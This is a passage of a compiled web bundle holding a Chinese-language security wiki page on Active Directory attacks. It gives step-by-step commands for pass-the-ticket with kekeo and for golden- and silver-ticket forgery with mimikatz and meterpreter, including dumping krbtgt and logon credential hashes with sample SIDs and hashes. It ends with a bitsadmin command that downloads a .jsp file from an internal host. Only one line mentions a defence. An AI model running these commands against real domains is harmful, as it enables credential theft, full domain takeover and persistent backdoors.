comment"}),"#关键设置"),"\n",Object(b.b)("span",s({parentName:"code"},{className:"token builtin class-name"}),"set")," SMBPass ",Object(b.b)("span",s({parentName:"code"},{className:"token operator"}),"<"),"LM Hash",Object(b.b)("span",s({parentName:"code"},{className:"token operator"}),">"),":",Object(b.b)("span",s({parentName:"code"},{className:"token operator"}),"<"),"NTML Hash",Object(b.b)("span",s({parentName:"code"},{className:"token operator"}),">")))),Object(b.b)("h1",{className:"__internal",id:"票据传递攻击"},"票据传递攻击",Object(b.b)("a",s({parentName:"h1"},{href:"#%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB","aria-hidden":!0,className:"anchor"}),"#")),Object(b.b)("blockquote",null,Object(b.b)("p",{parentName:"blockquote"},"票据传递（Pass the Ticket，PtT），使用 Kerberos票据，不需要管理员权限，攻击有效期是在票据有效期之内(一般为7天)。"),Object(b.b)("p",{parentName:"blockquote"},"在微软活动目录中颁发的TGT是可移植的，由于Kerberos的无状态特性，TGT中并没有关于票据来源的标识信息。"),Object(b.b)("p",{parentName:"blockquote"},"这意味着可以从某台计算机上导出一个有效的TGT，然后导入到该环境中其他的计算机上。"),Object(b.b)("p",{parentName:"blockquote"},"新导入的票据可以用于域的身份认证，并拥有票据中指定用户的权限来访问网络资源。")),Object(b.b)("p",null,"工具kekeo：",Object(b.b)("a",s({parentName:"p"},{href:"https://github.com/gentilkiwi/kekeo/releases",target:"_blank"}),"https://github.com/gentilkiwi/kekeo/releases")," "),Object(b.b)("p",null,"（1）在当前目录生成一个高权限票据文件"),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),"kekeo.exe ",Object(b.b)("span",s({parentName:"code"},{className:"token string"}),'"tgt::ask /user:Administrator /domain:wintrysec.lab /ntlm:f3a0acba8bcfb8a0896281bbfcb793ed"')," ",Object(b.b)("span",s({parentName:"code"},{className:"token builtin class-name"}),"exit")))),Object(b.b)("p",null,"（2）使用系统自带命令，清除内存中的票据"),Object(b.b)("div",{className:"rcpress-highlight","data-language":"baash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-baash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-baash"}),"klist purge"))),Object(b.b)("p",null,"（3）将票据文件导入内存"),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),"kekeo ",Object(b.b)("span",s({parentName:"code"},{className:"token string"}),'"kerberos::ptt TGT_administrator@WINTRYSEC.LAB_krbtgt~wintrysec.lab@WINTRYSEC.LAB.kirbi"')," ",Object(b.b)("span",s({parentName:"code"},{className:"token builtin class-name"}),"exit")))),Object(b.b)("p",null,"（4）列出远程主机的文件"),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),Object(b.b)("span",s({parentName:"code"},{className:"token function"}),"dir")," ",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"DC",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"c$"))),Object(b.b)("p",null,Object(b.b)("inlineCode",{parentName:"p"},"比较典型的金票和银票留域后门就是票据传递攻击")),Object(b.b)("h1",{className:"__internal",id:"kerberos认证协议"},"Kerberos认证协议",Object(b.b)("a",s({parentName:"h1"},{href:"#kerberos%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE","aria-hidden":!0,className:"anchor"}),"#")),Object(b.b)("p",null,"Kerberos是一种基于票据的集中式的认证方式，认证过程涉及到三方：Client、Server、KDC。"),Object(b.b)("p",null,"在Windows域环境中，KDC的角色常常由DC（域控制器）来担任。"),Object(b.b)("p",null,"票据（Ticket）用来安全的在认证服务器和用户请求的服务之间传递用户的身份。"),Object(b.b)("blockquote",null,Object(b.b)("p",{parentName:"blockquote"},Object(b.b)("strong",{parentName:"p"},"KDC（Key Distribution Center）："),"密钥分发中心，kerberos认证服务器，由AS和TGS组成，在认证中会访问 AD数据库；"),Object(b.b)("p",{parentName:"blockquote"},Object(b.b)("strong",{parentName:"p"},"AS（Authentication Server）："),"身份认证服务"),Object(b.b)("p",{parentName:"blockquote"},Object(b.b)("strong",{parentName:"p"},"TGS（Ticket Granting Server）："),"票据授予服务，该服务提供的票据为（",Object(b.b)("strong",{parentName:"p"},"白银票据"),"）"),Object(b.b)("p",{parentName:"blockquote"},Object(b.b)("strong",{parentName:"p"},"TGT（Ticket Granting Ticket）："),"身份认证服务授予的票据（",Object(b.b)("strong",{parentName:"p"},"黄金票据"),"），用于身份认证，存储在内存，默认有效期为10小时")),Object(b.b)("p",null,"在域环境中，每个用户账号的票据都是由Krbtgt生成的，这个账号的密码，储存在域控服务上 。"),Object(b.b)("h1",{className:"__internal",id:"金票和银票"},"金票和银票",Object(b.b)("a",s({parentName:"h1"},{href:"#%E9%87%91%E7%A5%A8%E5%92%8C%E9%93%B6%E7%A5%A8","aria-hidden":!0,className:"anchor"}),"#")),Object(b.b)("h2",{className:"__internal",id:"黄金票据（golden-ticket）"},"黄金票据（Golden Ticket）",Object(b.b)("a",s({parentName:"h2"},{href:"#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%EF%BC%88golden-ticket%EF%BC%89","aria-hidden":!0,className:"anchor"}),"#")),Object(b.b)("blockquote",null,Object(b.b)("p",{parentName:"blockquote"},"黄金票据：即伪造的",Object(b.b)("inlineCode",{parentName:"p"},"TGT"),"票据，当攻击者拥有了高权限的TGT，就可以发送给KDC的TGS 换取",Object(b.b)("inlineCode",{parentName:"p"},"任意Server"),"的票据（ST）。"),Object(b.b)("p",{parentName:"blockquote"},"有了金票就有了当前域内的最高控制权限。")),Object(b.b)("p",null,"金票的",Object(b.b)("strong",{parentName:"p"},"利用原理"),"是直接跳过了KDC的AS认证过程（AS-REQ、AS-REP通信）。"),Object(b.b)("p",null,"由于黄金票据是伪造的TGT，它作为TGS-REQ的一部分被发送到KDC的TGS，以获取服务票据ST。"),Object(b.b)("p",null,"伪造的黄金票据是 有效的TGT票据，因为它是由域账号",Object(b.b)("inlineCode",{parentName:"p"},"krbtgt"),"的",Object(b.b)("inlineCode",{parentName:"p"},"NTLM Hash"),"加密和签名的。"),Object(b.b)("p",null,"TGT用于向KDC的TGS服务证明Client已经过AS认证，TGT可以被该域内的任何KDC服务器解密。"),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"1、导出",Object(b.b)("inlineCode",{parentName:"strong"},"krbtgt"),"的",Object(b.b)("inlineCode",{parentName:"strong"},"NTML Hash"))),Object(b.b)("p",null,"域管理员权限运行mimikatz（或其它域主机的本地管理员账号密码和域控相同也行）"),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),"mimikatz.exe ",Object(b.b)("span",s({parentName:"code"},{className:"token string"}),'"lsadump::dcsync /user:krbtgt"')," ",Object(b.b)("span",s({parentName:"code"},{className:"token builtin class-name"}),"exit"),"\n\n",Object(b.b)("span",s({parentName:"code"},{className:"token comment"}),"#MSF中的hashdump也可以"),"\nmeterpreter",Object(b.b)("span",s({parentName:"code"},{className:"token operator"}),">")," hashdump"))),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"2、获取域中所有用户SID")),Object(b.b)("p",null,"应用的时候，去掉SID最后的数字"),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),Object(b.b)("span",s({parentName:"code"},{className:"token comment"}),"#只要是域用户权限就行"),"\nwmic useraccount get name,sid"))),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"3、制造黄金票据")),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"（1）清空现有票据")),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),"mimikatz.exe ",Object(b.b)("span",s({parentName:"code"},{className:"token string"}),'"kerberos::purge"')," ",Object(b.b)("span",s({parentName:"code"},{className:"token builtin class-name"}),"exit")))),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"（2）生成票据")),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),"mimikatz.exe ",Object(b.b)("span",s({parentName:"code"},{className:"token string"}),'"kerberos::golden /admin:Administrator /domain:wintrysec.lab /sid:S-1-5-21-1160434164-3042164129-2463410311 /krbtgt:a8424e3f13e1253ea732a5245f2f4266 /ticket:Administrator.kiribi"')," ",Object(b.b)("span",s({parentName:"code"},{className:"token builtin class-name"}),"exit")))),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"4、将票据注入内存")),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),"mimikatz.exe ",Object(b.b)("span",s({parentName:"code"},{className:"token string"}),'"kerberos::ptt Administrator.kiribi"')," ",Object(b.b)("span",s({parentName:"code"},{className:"token builtin class-name"}),"exit")))),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"5、检索当前会话中的票据")),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),"mimikatz.exe ",Object(b.b)("span",s({parentName:"code"},{className:"token string"}),'"kerberos::tgt"')," ",Object(b.b)("span",s({parentName:"code"},{className:"token builtin class-name"}),"exit")))),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"6、权限验证")),Object(b.b)("p",null,"列出域控的C盘"),Object(b.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(b.b)("pre",s({parentName:"div"},{className:"language-text"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-text"}),"dir \\\\DC\\c$"))),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"使用meterpreter中的kiwi模块")," "),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),"meterpreter",Object(b.b)("span",s({parentName:"code"},{className:"token operator"}),">")," load kiwi\n\n",Object(b.b)("span",s({parentName:"code"},{className:"token comment"}),"#创建票据"),"\nmeterpreter",Object(b.b)("span",s({parentName:"code"},{className:"token operator"}),">")," golden_ticket_create -d wintrysec.lab -u Administrator -s S-1-5-21-1160434164-3042164129-2463410311 -k a8424e3f13e1253ea732a5245f2f4266 -t /tmp/krbtgt.ticket\n\n",Object(b.b)("span",s({parentName:"code"},{className:"token comment"}),"#注入到内存"),"\nmeterpreter",Object(b.b)("span",s({parentName:"code"},{className:"token operator"}),">")," kerberos_ticket_use /tmp/krbtgt.ticket\n\n",Object(b.b)("span",s({parentName:"code"},{className:"token comment"}),"#然后验证权限"),"\n",Object(b.b)("span",s({parentName:"code"},{className:"token function"}),"dir")," ",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"DC",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"c$"))),Object(b.b)("blockquote",null,Object(b.b)("p",{parentName:"blockquote"},Object(b.b)("strong",{parentName:"p"},"当拿到域控后，通过伪造黄金票据，可以在域中留下一个畅通全域的后门")),Object(b.b)("p",{parentName:"blockquote"},Object(b.b)("strong",{parentName:"p"},"防御方法："),"修改域管理员密码后，同时也要修改",Object(b.b)("inlineCode",{parentName:"p"},"krbtgt"),"用户的密码")),Object(b.b)("h2",{className:"__internal",id:"白银票据-（silver-ticket）"},"白银票据 （Silver Ticket）",Object(b.b)("a",s({parentName:"h2"},{href:"#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-%EF%BC%88silver-ticket%EF%BC%89","aria-hidden":!0,className:"anchor"}),"#")),Object(b.b)("blockquote",null,Object(b.b)("p",{parentName:"blockquote"},Object(b.b)("strong",{parentName:"p"},"白银票据"),"：即伪造的",Object(b.b)("inlineCode",{parentName:"p"},"TGS"),"票据，也称服务票据ST。"),Object(b.b)("p",{parentName:"blockquote"},"攻击者通过伪造合法的TGS，可以直接发送给Server，访问指定的某个服务。"),Object(b.b)("p",{parentName:"blockquote"},"当拥有Server(Service) Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket。"),Object(b.b)("p",{parentName:"blockquote"},"Server Session Key在未发送Ticket之前，服务器是不知道Server Session Key是什么的。"),Object(b.b)("p",{parentName:"blockquote"},"因此，银票的关键也在于Server的HTLM-Hash")),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"获取Server（目标服务器）的NTML hash")),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),"mimikatz.exe ",Object(b.b)("span",s({parentName:"code"},{className:"token string"}),'"privilege::debug"')," ",Object(b.b)("span",s({parentName:"code"},{className:"token string"}),'"sekurlsa::logonpasswords"')," ",Object(b.b)("span",s({parentName:"code"},{className:"token builtin class-name"}),"exit")))),Object(b.b)("p",null,"或MSF模块"),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),"meterpreter ",Object(b.b)("span",s({parentName:"code"},{className:"token operator"}),">")," load mimikatz\nmeterpreter ",Object(b.b)("span",s({parentName:"code"},{className:"token operator"}),">")," msv"))),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"制造白银票据")),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"（1）清空当前系统的票据")),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),Object(b.b)("span",s({parentName:"code"},{className:"token comment"}),"#使用系统命令"),"\nklist purge"))),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"（2）伪造票据")),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),"mimikatz.exe ",Object(b.b)("span",s({parentName:"code"},{className:"token string"}),'"kerberos::golden /domain:wintrysec.lab /sid:S-1-5-21-1160434164-3042164129-2463410311 /target:DC.wintrysec.lab /service:CIFS /rc4:f0e889883425d83b0071e789507b3e6b /user:admin666 /ptt"')," ",Object(b.b)("span",s({parentName:"code"},{className:"token builtin class-name"}),"exit")))),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"（3）验证权限")),Object(b.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(b.b)("pre",s({parentName:"div"},{className:"language-text"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-text"}),"dir \\\\DC\\c$"))),Object(b.b)("h2",{className:"__internal",id:"黄金票据和白银票据的不同"},"黄金票据和白银票据的不同",Object(b.b)("a",s({parentName:"h2"},{href:"#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E7%9A%84%E4%B8%8D%E5%90%8C","aria-hidden":!0,className:"anchor"}),"#")),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"访问权限不同：")),Object(b.b)("ul",null,Object(b.b)("li",s({parentName:"ul"},{className:"__internal"}),"Golden Ticket：伪造TGT，可以获取任何Kerberos服务权限"),Object(b.b)("li",s({parentName:"ul"},{className:"__internal"}),"Silver Ticket：伪造TGS，只能访问指定的服务")),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"加密方式不同：")),Object(b.b)("ul",null,Object(b.b)("li",s({parentName:"ul"},{className:"__internal"}),"Golden Ticket由Kerberos的Hash加密"),Object(b.b)("li",s({parentName:"ul"},{className:"__internal"}),"Silver Ticket由服务账号（通常为计算机账户）Hash加密")),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"认证流程不同：")),Object(b.b)("ul",null,Object(b.b)("li",s({parentName:"ul"},{className:"__internal"}),"Golden Ticket的利用过程需要访问域控，"),Object(b.b)("li",s({parentName:"ul"},{className:"__internal"}),"而Silver Ticket不需要")),Object(b.b)("h1",{className:"__internal",id:"windows文件下载"},"Windows文件下载",Object(b.b)("a",s({parentName:"h1"},{href:"#windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD","aria-hidden":!0,className:"anchor"}),"#")),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),"bitsadmin /transfer n http://192.168.9.202/wintrysec.jsp C:",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"Users",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"Administrator",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"Desktop",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"新建文件夹",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"wintrysec.jsp"))))}N.isMDXComponent=!0,N=Object(c.hot)(e)(N),(p="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.default:void 0)&&(p.register(m,"makeShortcode","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\hw\\ntml-hash.md"),p.register(o,"layoutProps","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\hw\\ntml-hash.md"),p.register(i,"MDXLayout","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\hw\\ntml-hash.md"),p.register(N,"MDXContent","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\hw\\ntml-hash.md")),(l="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.leaveModule:void 0)&&l(e)}.call(this,t(23)(e))}}]);